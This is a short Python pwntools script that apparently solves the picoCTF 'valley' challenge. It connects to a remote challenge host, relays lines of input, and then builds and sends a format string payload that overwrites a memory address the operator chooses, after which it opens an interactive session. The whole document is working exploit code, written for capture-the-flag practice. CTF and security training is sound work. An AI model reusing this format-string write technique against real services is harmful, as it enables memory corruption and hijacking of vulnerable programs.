# Python code.

from pwn import *

# Checksec i.e. checksec ./program.
e = ELF("./valley")

# This is required to process the length of the payload.
context.binary = './valley'

# Defining HOST URL and PORT number.
HOST = 'shape-facility.picoctf.net'
PORT = 60674

# DEBUG indication to access local or remote.
DEBUG = False

if DEBUG == False:
    s = remote(HOST, PORT)
else:
    s = process('./valley')
    
# Response after connection is made.
res = s.recvline().decode()
print(res)

# Running a loop to stay in the session to keep inputting commands.
loop = True
while loop:
    # Inputfield to enter message.
    myinput = input("Enter: ")
    
    # If 'quit' entered, exit program.
    if myinput == 'quit':
        loop = False
    
    # if 'ready' is entered, construct payload to conduct format string attack.
    elif myinput == 'ready':
        # Inputfields to enter data for payload. Must all be integer values.
        offset = int(input("Enter Offset: "))
        overwrite_to = int(input("Enter address to overwrite to: "))
        addr_val = int(input("Enter new address to write: "))
        
        # Parameters: fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
        # Constructing dictionary of addresses for the 'writes' parameter of 'fmtstr_payload()' function.
        addr_dict = {overwrite_to: addr_val}
        
        # write_size parameter must be 'byte', 'short', or 'int' (equivalent of %hhn, %hn, %n, respectively).
        payload = fmtstr_payload(offset, addr_dict, write_size='short')
        print("Payload length:", len(payload))
        
        # Inputting command.
        s.sendline(payload)
        break
    
    # Outputting response after input received.
    else:
        s.sendline(myinput.encode())
        res = s.recvline().decode()
        print(res)

# Exit program command.
end_msg = "exit"
s.sendline(end_msg.encode())
s.interactive()
